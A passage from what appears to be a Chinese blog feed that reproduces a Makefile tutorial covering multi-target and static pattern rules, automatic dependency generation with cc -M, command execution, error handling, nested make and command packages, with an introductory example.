href="https://seisman.github.io/how-to-write-makefile/rules.html#id7">¶</a></h2><p>Makefile的规则中的目标可以不止一个，其支持多目标，有可能我们的多个目标同时依赖于一个文件，并且其生成的命令大体类似。于是我们就能把其合并起来。当然，多个目标的生成规则的执行命令不是同一个，这可能会给我们带来麻烦，不过好在我们可以使用一个自动化变量 <code>$@</code> （关于自动化变量，将在后面讲述），这个变量表示着目前规则中所有的目标的集合，这样说可能很抽象，还是看一个例子吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bigoutput littleoutput : text.g</span><br><span class="line">    generate text.g -$(subst output,,$@) &gt; $@</span><br></pre></td></tr></table></figure><p>上述规则等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bigoutput : text.g</span><br><span class="line">    generate text.g -big &gt; bigoutput</span><br><span class="line">littleoutput : text.g</span><br><span class="line">    generate text.g -little &gt; littleoutput</span><br></pre></td></tr></table></figure><p>其中， <code>-$(subst output,,$@)</code> 中的 <code>$</code> 表示执行一个Makefile的函数，函数名为subst，后面的为参数。关于函数，将在后面讲述。这里的这个函数是替换字符串的意思， <code>$@</code> 表示目标的集合，就像一个数组， <code>$@</code> 依次取出目标，并执于命令。</p><h2 id="静态模式">静态模式<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id8">¶</a></h2><p>静态模式可以更加容易地定义多目标的规则，可以让我们的规则变得更加的有弹性和灵活。我们还是先来看一下语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;targets ...&gt; : &lt;target-pattern&gt; : &lt;prereq-patterns ...&gt;</span><br><span class="line">    &lt;commands&gt;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>targets定义了一系列的目标文件，可以有通配符。是目标的一个集合。</p><p>target-pattern是指明了targets的模式，也就是的目标集模式。</p><p>prereq-patterns是目标的依赖模式，它对target-pattern形成的模式再进行一次依赖目标的定义。</p><p>这样描述这三个东西，可能还是没有说清楚，还是举个例子来说明一下吧。如果我们的<target-pattern>定义成 <code>%.o</code> ，意思是我们的<target>;集合中都是以 <code>.o</code> 结尾的，而如果我们的<prereq-patterns>定义成 <code>%.c</code> ，意思是对<target-pattern>所形成的目标集进行二次定义，其计算方法是，取<target-pattern>模式中的 <code>%</code> （也就是去掉了 <code>.o</code> 这个结尾），并为其加上 <code>.c</code> 这个结尾，形成的新集合。</p><p>所以，我们的“目标模式”或是“依赖模式”中都应该有 <code>%</code> 这个字符，如果你的文件名中有 <code>%</code> 那么你可以使用反斜杠 <code>\</code> 进行转义，来标明真实的 <code>%</code> 字符。</p><p>看一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">objects = foo.o bar.o</span><br><span class="line"></span><br><span class="line">all: $(objects)</span><br><span class="line"></span><br><span class="line">$(objects): %.o: %.c</span><br><span class="line">    $(CC) -c $(CFLAGS) $&lt; -o $@</span><br></pre></td></tr></table></figure><p>上面的例子中，指明了我们的目标从<code>objects</code>中获取， <code>%.o</code> 表明要所有以 <code>.o</code> 结尾的目标，也就是 <code>foo.o bar.o</code> ，也就是变量 <code>objects</code> 集合的模式，而依赖模式 <code>%.c</code> 则取模式 <code>%.o</code> 的 <code>%</code> ，也就是 <code>foo bar</code> ，并为其加下 <code>.c</code> 的后缀，于是，我们的依赖目标就是 <code>foo.c bar.c</code> 。而命令中的 <code>&lt;</code> 和 <code>@</code> 则是自动化变量， <code>&lt;</code>  表示第一个依赖文件，  <code>@</code> 表示目标集（也就是“foo.o bar.o”）。于是，上面的规则展开后等价于下面的规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foo.o : foo.c</span><br><span class="line">    $(CC) -c $(CFLAGS) foo.c -o foo.o</span><br><span class="line">bar.o : bar.c</span><br><span class="line">    $(CC) -c $(CFLAGS) bar.c -o bar.o</span><br></pre></td></tr></table></figure><p>试想，如果我们的 <code>%.o</code> 有几百个，那么我们只要用这种很简单的“静态模式规则”就可以写完一堆规则，实在是太有效率了。“静态模式规则”的用法很灵活，如果用得好，那会是一个很强大的功能。再看一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">files = foo.elc bar.o lose.o</span><br><span class="line"></span><br><span class="line">$(filter %.o,$(files)): %.o: %.c</span><br><span class="line">    $(CC) -c $(CFLAGS) $&lt; -o $@</span><br><span class="line">$(filter %.elc,$(files)): %.elc: %.el</span><br><span class="line">    emacs -f batch-byte-compile $&lt;</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">(filter %.o,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>(files))表示调用Makefile的filter函数，过滤“$files”集，只要其中模式为“%.o”的内容。其它的内容，我就不用多说了吧。这个例子展示了Makefile中更大的弹性。</p><h2 id="自动生成依赖性">自动生成依赖性<a href="https://seisman.github.io/how-to-write-makefile/rules.html#id9">¶</a></h2><p>在Makefile中，我们的依赖关系可能会需要包含一系列的头文件，比如，如果我们的main.c中有一句 <code>#include &quot;defs.h&quot;</code> ，那么我们的依赖关系应该是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main.o : main.c defs.h</span><br></pre></td></tr></table></figure><p>但是，如果是一个比较大型的工程，你必需清楚哪些C文件包含了哪些头文件，并且，你在加入或删除头文件时，也需要小心地修改Makefile，这是一个很没有维护性的工作。为了避免这种繁重而又容易出错的事情，我们可以使用C/C<ins>编译的一个功能。大多数的C/C</ins>编译器都支持一个“-M”的选项，即自动找寻源文件中包含的头文件，并生成一个依赖关系。例如，如果我们执行下面的命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc -M main.c</span><br></pre></td></tr></table></figure><p>其输出是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main.o : main.c defs.h</span><br></pre></td></tr></table></figure><p>于是由编译器自动生成的依赖关系，这样一来，你就不必再手动书写若干文件的依赖关系，而由编译器自动生成了。需要提醒一句的是，如果你使用GNU的C/C++编译器，你得用 <code>-MM</code> 参数，不然， <code>-M</code> 参数会把一些标准库的头文件也包含进来。</p><p>gcc -M main.c的输出是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main.o: main.c defs.h /usr/include/stdio.h /usr/include/features.h \</span><br><span class="line">    /usr/include/sys/cdefs.h /usr/include/gnu/stubs.h \</span><br><span class="line">    /usr/lib/gcc-lib/i486-suse-linux/2.95.3/include/stddef.h \</span><br><span class="line">    /usr/include/bits/types.h /usr/include/bits/pthreadtypes.h \</span><br><span class="line">    /usr/include/bits/sched.h /usr/include/libio.h \</span><br><span class="line">    /usr/include/_G_config.h /usr/include/wchar.h \</span><br><span class="line">    /usr/include/bits/wchar.h /usr/include/gconv.h \</span><br><span class="line">    /usr/lib/gcc-lib/i486-suse-linux/2.95.3/include/stdarg.h \</span><br><span class="line">    /usr/include/bits/stdio_lim.h</span><br></pre></td></tr></table></figure><p>gcc -MM main.c的输出则是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main.o: main.c defs.h</span><br></pre></td></tr></table></figure><p>那么，编译器的这个功能如何与我们的Makefile联系在一起呢。因为这样一来，我们的Makefile也要根据这些源文件重新生成，让 Makefile自已依赖于源文件？这个功能并不现实，不过我们可以有其它手段来迂回地实现这一功能。GNU组织建议把编译器为每一个源文件的自动生成的依赖关系放到一个文件中，为每一个 <code>name.c</code> 的文件都生成一个 <code>name.d</code> 的Makefile文件， <code>.d</code> 文件中就存放对应 <code>.c</code> 文件的依赖关系。</p><p>于是，我们可以写出 <code>.c</code> 文件和 <code>.d</code> 文件的依赖关系，并让make自动更新或生成 <code>.d</code> 文件，并把其包含在我们的主Makefile中，这样，我们就可以自动化地生成每个文件的依赖关系了。</p><p>这里，我们给出了一个模式规则来产生 <code>.d</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%.d: %.c</span><br><span class="line">    @set -e; rm -f $@; \</span><br><span class="line">    $(CC) -M $(CPPFLAGS) $&lt; &gt; $@.$$$$; \</span><br><span class="line">    sed &#x27;s,\($*\)\.o[ :]*,\1.o $@ : ,g&#x27; &lt; $@.$$$$ &gt; $@; \</span><br><span class="line">    rm -f $@.$$$$</span><br></pre></td></tr></table></figure><p>这个规则的意思是，所有的 <code>.d</code> 文件依赖于 <code>.c</code> 文件， <code>rm -f $@</code> 的意思是删除所有的目标，也就是 <code>.d</code> 文件，第二行的意思是，为每个依赖文件 <code>$&lt;</code> ，也就是 <code>.c</code> 文件生成依赖文件， <code>$@</code> 表示模式 <code>%.d</code> 文件，如果有一个C文件是name.c，那么 <code>%</code> 就是 <code>name</code> ， <code>$$$$</code> 意为一个随机编号，第二行生成的文件有可能是“name.d.12345”，第三行使用sed命令做了一个替换，关于sed命令的用法请参看相关的使用文档。第四行就是删除临时文件。</p><p>总而言之，这个模式要做的事就是在编译器生成的依赖关系中加入 <code>.d</code> 文件的依赖，即把依赖关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main.o : main.c defs.h</span><br></pre></td></tr></table></figure><p>转成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main.o main.d : main.c defs.h</span><br></pre></td></tr></table></figure><p>于是，我们的 <code>.d</code> 文件也会自动更新了，并会自动生成了，当然，你还可以在这个 <code>.d</code> 文件中加入的不只是依赖关系，包括生成的命令也可一并加入，让每个 <code>.d</code> 文件都包含一个完赖的规则。一旦我们完成这个工作，接下来，我们就要把这些自动生成的规则放进我们的主Makefile中。我们可以使用Makefile的“include”命令，来引入别的Makefile文件（前面讲过），例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sources = foo.c bar.c</span><br><span class="line"></span><br><span class="line">include $(sources:.c=.d)</span><br></pre></td></tr></table></figure><p>上述语句中的 <code>$(sources:.c=.d)</code> 中的 <code>.c=.d</code> 的意思是做一个替换，把变量 <code>$(sources)</code> 所有 <code>.c</code> 的字串都替换成 <code>.d</code> ，关于这个“替换”的内容，在后面我会有更为详细的讲述。当然，你得注意次序，因为include是按次序来载入文件，最先载入的 <code>.d</code> 文件中的目标会成为默认目标。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Make书写命令</title>
      <link href="/2024/04/26/Security/binary/Makefile/3.%E4%B9%A6%E5%86%99%E5%91%BD%E4%BB%A4/"/>
      <url>/2024/04/26/Security/binary/Makefile/3.%E4%B9%A6%E5%86%99%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="书写命令">书写命令<a href="https://seisman.github.io/how-to-write-makefile/recipes.html#id1">¶</a></h1><p>每条规则中的命令和操作系统Shell的命令行是一致的。make会一按顺序一条一条的执行命令，每条命令的开头必须以 <code>Tab</code> 键开头，除非，命令是紧跟在依赖规则后面的分号后的。在命令行之间中的空格或是空行会被忽略，但是如果该空格或空行是以Tab键开头的，那么make会认为其是一个空命令。</p><p>我们在UNIX下可能会使用不同的Shell，但是make的命令默认是被 <code>/bin/sh</code> ——UNIX的标准Shell 解释执行的。除非你特别指定一个其它的Shell。Makefile中， <code>#</code> 是注释符，很像C/C++中的 <code>//</code> ，其后的本行字符都被注释。</p><h2 id="显示命令">显示命令<a href="https://seisman.github.io/how-to-write-makefile/recipes.html#id2">¶</a></h2><p>通常，make会把其要执行的命令行在命令执行前输出到屏幕上。当我们用 <code>@</code> 字符在命令行前，那么，这个命令将不被make显示出来，最具代表性的例子是，我们用这个功能来向屏幕显示一些信息。如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@echo 正在编译XXX模块......</span><br></pre></td></tr></table></figure><p>当make执行时，会输出“正在编译XXX模块……”字串，但不会输出命令，如果没有“@”，那么，make将输出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 正在编译XXX模块......</span><br><span class="line">正在编译XXX模块......</span><br></pre></td></tr></table></figure><p>如果make执行时，带入make参数 <code>-n</code> 或 <code>--just-print</code> ，那么其只是显示命令，但不会执行命令，这个功能很有利于我们调试我们的Makefile，看看我们书写的命令是执行起来是什么样子的或是什么顺序的。</p><p>而make参数 <code>-s</code> 或 <code>--silent</code> 或 <code>--quiet</code> 则是全面禁止命令的显示。</p><h2 id="命令执行">命令执行<a href="https://seisman.github.io/how-to-write-makefile/recipes.html#id3">¶</a></h2><p>当依赖目标新于目标时，也就是当规则的目标需要被更新时，make会一条一条的执行其后的命令。需要注意的是，如果你要让上一条命令的结果应用在下一条命令时，你应该使用分号分隔这两条命令。比如你的第一条命令是cd命令，你希望第二条命令得在cd之后的基础上运行，那么你就不能把这两条命令写在两行上，而应该把这两条命令写在一行上，用分号分隔。如：</p><ul><li>示例一：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec:</span><br><span class="line">    cd /home/hchen</span><br><span class="line">    pwd</span><br></pre></td></tr></table></figure><ul><li>示例二：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec:</span><br><span class="line">    cd /home/hchen; pwd</span><br></pre></td></tr></table></figure><p>当我们执行 <code>make exec</code> 时，第一个例子中的cd没有作用，pwd会打印出当前的Makefile目录，而第二个例子中，cd就起作用了，pwd会打印出“/home/hchen”。</p><p>make一般是使用环境变量SHELL中所定义的系统Shell来执行命令，默认情况下使用UNIX的标准Shell——/bin/sh来执行命令。但在MS-DOS下有点特殊，因为MS-DOS下没有SHELL环境变量，当然你也可以指定。如果你指定了UNIX风格的目录形式，首先，make会在SHELL所指定的路径中找寻命令解释器，如果找不到，其会在当前盘符中的当前目录中寻找，如果再找不到，其会在PATH环境变量中所定义的所有路径中寻找。MS-DOS中，如果你定义的命令解释器没有找到，其会给你的命令解释器加上诸如 <code>.exe</code> 、 <code>.com</code> 、 <code>.bat</code> 、 <code>.sh</code> 等后缀。</p><h2 id="命令出错">命令出错<a href="https://seisman.github.io/how-to-write-makefile/recipes.html#id4">¶</a></h2><p>每当命令运行完后，make会检测每个命令的返回码，如果命令返回成功，那么make会执行下一条命令，当规则中所有的命令成功返回后，这个规则就算是成功完成了。如果一个规则中的某个命令出错了（命令退出码非零），那么make就会终止执行当前规则，这将有可能终止所有规则的执行。</p><p>有些时候，命令的出错并不表示就是错误的。例如mkdir命令，我们一定需要建立一个目录，如果目录不存在，那么mkdir就成功执行，万事大吉，如果目录存在，那么就出错了。我们之所以使用mkdir的意思就是一定要有这样的一个目录，于是我们就不希望mkdir出错而终止规则的运行。</p><p>为了做到这一点，忽略命令的出错，我们可以在Makefile的命令行前加一个减号 <code>-</code> （在Tab键之后），标记为不管命令出不出错都认为是成功的。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clean:</span><br><span class="line">    -rm -f *.o</span><br></pre></td></tr></table></figure><p>还有一个全局的办法是，给make加上 <code>-i</code> 或是 <code>--ignore-errors</code> 参数，那么，Makefile中所有命令都会忽略错误。而如果一个规则是以 <code>.IGNORE</code> 作为目标的，那么这个规则中的所有命令将会忽略错误。这些是不同级别的防止命令出错的方法，你可以根据你的不同喜欢设置。</p><p>还有一个要提一下的make的参数的是 <code>-k</code> 或是 <code>--keep-going</code> ，这个参数的意思是，如果某规则中的命令出错了，那么就终止该规则的执行，但继续执行其它规则。</p><h2 id="嵌套执行make">嵌套执行make<a href="https://seisman.github.io/how-to-write-makefile/recipes.html#make">¶</a></h2><p>在一些大的工程中，我们会把我们不同模块或是不同功能的源文件放在不同的目录中，我们可以在每个目录中都书写一个该目录的Makefile，这有利于让我们的Makefile变得更加地简洁，而不至于把所有的东西全部写在一个Makefile中，这样会很难维护我们的Makefile，这个技术对于我们模块编译和分段编译有着非常大的好处。</p><p>例如，我们有一个子目录叫subdir，这个目录下有个Makefile文件，来指明了这个目录下文件的编译规则。那么我们总控的Makefile可以这样书写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subsystem:</span><br><span class="line">    cd subdir &amp;&amp; $(MAKE)</span><br></pre></td></tr></table></figure><p>其等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subsystem:</span><br><span class="line">    $(MAKE) -C subdir</span><br></pre></td></tr></table></figure><p>定义$(MAKE)宏变量的意思是，也许我们的make需要一些参数，所以定义成一个变量比较利于维护。这两个例子的意思都是先进入“subdir”目录，然后执行make命令。</p><p>我们把这个Makefile叫做“总控Makefile”，总控Makefile的变量可以传递到下级的Makefile中（如果你显示的声明），但是不会覆盖下层的Makefile中所定义的变量，除非指定了 <code>-e</code> 参数。</p><p>如果你要传递变量到下级Makefile中，那么你可以使用这样的声明:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export &lt;variable ...&gt;;</span><br></pre></td></tr></table></figure><p>如果你不想让某些变量传递到下级Makefile中，那么你可以这样声明:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unexport &lt;variable ...&gt;;</span><br></pre></td></tr></table></figure><p>如：</p><p>示例一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export variable = value</span><br></pre></td></tr></table></figure><p>其等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">variable = value</span><br><span class="line">export variable</span><br></pre></td></tr></table></figure><p>其等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export variable := value</span><br></pre></td></tr></table></figure><p>其等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">variable := value</span><br><span class="line">export variable</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export variable += value</span><br></pre></td></tr></table></figure><p>其等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">variable += value</span><br><span class="line">export variable</span><br></pre></td></tr></table></figure><p>如果你要传递所有的变量，那么，只要一个export就行了。后面什么也不用跟，表示传递所有的变量。</p><p>需要注意的是，有两个变量，一个是 <code>SHELL</code> ，一个是 <code>MAKEFLAGS</code> ，这两个变量不管你是否export，其总是要传递到下层 Makefile中，特别是 <code>MAKEFLAGS</code> 变量，其中包含了make的参数信息，如果我们执行“总控Makefile”时有make参数或是在上层 Makefile中定义了这个变量，那么 <code>MAKEFLAGS</code> 变量将会是这些参数，并会传递到下层Makefile中，这是一个系统级的环境变量。</p><p>但是make命令中的有几个参数并不往下传递，它们是 <code>-C</code> , <code>-f</code> , <code>-h</code>, <code>-o</code> 和 <code>-W</code> （有关Makefile参数的细节将在后面说明），如果你不想往下层传递参数，那么，你可以这样来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subsystem:</span><br><span class="line">    cd subdir &amp;&amp; $(MAKE) MAKEFLAGS=</span><br></pre></td></tr></table></figure><p>如果你定义了环境变量 <code>MAKEFLAGS</code> ，那么你得确信其中的选项是大家都会用到的，如果其中有 <code>-t</code> , <code>-n</code> 和 <code>-q</code> 参数，那么将会有让你意想不到的结果，或许会让你异常地恐慌。</p><p>还有一个在“嵌套执行”中比较有用的参数， <code>-w</code> 或是 <code>--print-directory</code> 会在make的过程中输出一些信息，让你看到目前的工作目录。比如，如果我们的下级make目录是“/home/hchen/gnu/make”，如果我们使用 <code>make -w</code> 来执行，那么当进入该目录时，我们会看到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make: Entering directory `/home/hchen/gnu/make&#x27;.</span><br></pre></td></tr></table></figure><p>而在完成下层make后离开目录时，我们会看到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make: Leaving directory `/home/hchen/gnu/make&#x27;</span><br></pre></td></tr></table></figure><p>当你使用 <code>-C</code> 参数来指定make下层Makefile时， <code>-w</code> 会被自动打开的。如果参数中有 <code>-s</code> （ <code>--slient</code> ）或是 <code>--no-print-directory</code> ，那么， <code>-w</code> 总是失效的。</p><h2 id="定义命令包">定义命令包<a href="https://seisman.github.io/how-to-write-makefile/recipes.html#id5">¶</a></h2><p>如果Makefile中出现一些相同命令序列，那么我们可以为这些相同的命令序列定义一个变量。定义这种命令序列的语法以 <code>define</code> 开始，以 <code>endef</code> 结束，如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define run-yacc</span><br><span class="line">yacc $(firstword $^)</span><br><span class="line">mv y.tab.c $@</span><br><span class="line">endef</span><br></pre></td></tr></table></figure><p>这里，“run-yacc”是这个命令包的名字，其不要和Makefile中的变量重名。在 <code>define</code> 和 <code>endef</code> 中的两行就是命令序列。这个命令包中的第一个命令是运行Yacc程序，因为Yacc程序总是生成“y.tab.c”的文件，所以第二行的命令就是把这个文件改改名字。还是把这个命令包放到一个示例中来看看吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo.c : foo.y</span><br><span class="line">    $(run-yacc)</span><br></pre></td></tr></table></figure><p>我们可以看见，要使用这个命令包，我们就好像使用变量一样。在这个命令包的使用中，命令包“run-yacc”中的 <code>$^</code> 就是 <code>foo.y</code> ， <code>$@</code> 就是 <code>foo.c</code> （有关这种以 <code>$</code> 开头的特殊变量，我们会在后面介绍），make在执行命令包时，命令包中的每个命令会被依次独立执行。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>makefile介绍</title>
      <link href="/2024/04/26/Security/binary/Makefile/1.Makefile%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/04/26/Security/binary/Makefile/1.Makefile%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile介绍">makefile介绍<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#makefile">¶</a></h1><p>make命令执行时，需要一个makefile文件，以告诉make命令需要怎么样的去编译和链接程序。</p><p>首先，我们用一个示例来说明makefile的书写规则，以便给大家一个感性认识。这个示例来源于gnu 的make使用手册，在这个示例中，我们的工程有8个c文件，和3个头文件，我们要写一个makefile来告诉make命令如何编译和链接这几个文件。我们的规则是：</p><blockquote><ol><li>如果这个工程没有编译过，那么我们的所有c文件都要编译并被链接。</li><li>如果这个工程的某几个c文件被修改，那么我们只编译被修改的c文件，并链接目标程序。</li><li>如果这个工程的头文件被改变了，那么我们需要编译引用了这几个头文件的c文件，并链接目标程序。</li></ol></blockquote><p>只要我们的makefile写得够好，所有的这一切，我们只用一个make命令就可以完成，make命令会自动智能地根据当前的文件修改的情况来确定哪些文件需要重编译，从而自动编译所需要的文件和链接目标程序。</p><h2 id="makefile的规则">makefile的规则<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id1">¶</a></h2><p>在讲述这个makefile之前，还是让我们先来粗略地看一看makefile的规则。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target ... : prerequisites ...</span><br><span class="line">    command</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><ul><li><p>target</p><p>可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。对于标签这种特性，在后续的“伪目标”章节中会有叙述。</p></li><li><p>prerequisites</p><p>生成该target所依赖的文件和/或target</p></li><li><p>command</p><p>该target要执行的命令（任意的shell命令）</p></li></ul><p>这是一个文件的依赖关系，也就是说，target这一个或多个的目标文件依赖于prerequisites中的文件，其生成规则定义在command中。说白一点就是说:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。</span><br></pre></td></tr></table></figure><p>这就是makefile的规则，也就是makefile中最核心的内容。</p><p>说到底，makefile的东西就是这样一点，好像我的这篇文档也该结束了。呵呵。还不尽然，这是makefile 的主线和核心，但要写好一个makefile还不够，我会在后面一点一点地结合我的工作经验给你慢慢道来。内容还多着呢。😃</p><h2 id="一个示例">一个示例<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id2">¶</a></h2><p>正如前面所说，如果一个工程有3个头文件和8个c文件，为了完成前面所述的那三个规则，我们的makefile 应该是下面的这个样子的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    cc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    cc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    cc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    cc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    cc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    cc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    cc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    cc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    cc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><p>反斜杠（ <code>\</code> ）是换行符的意思。这样比较便于makefile的阅读。我们可以把这个内容保存在名字为“makefile”或“Makefile”的文件中，然后在该目录下直接输入命令 <code>make</code> 就可以生成执行文件edit。如果要删除执行文件和所有的中间目标文件，那么，只要简单地执行一下 <code>make clean</code> 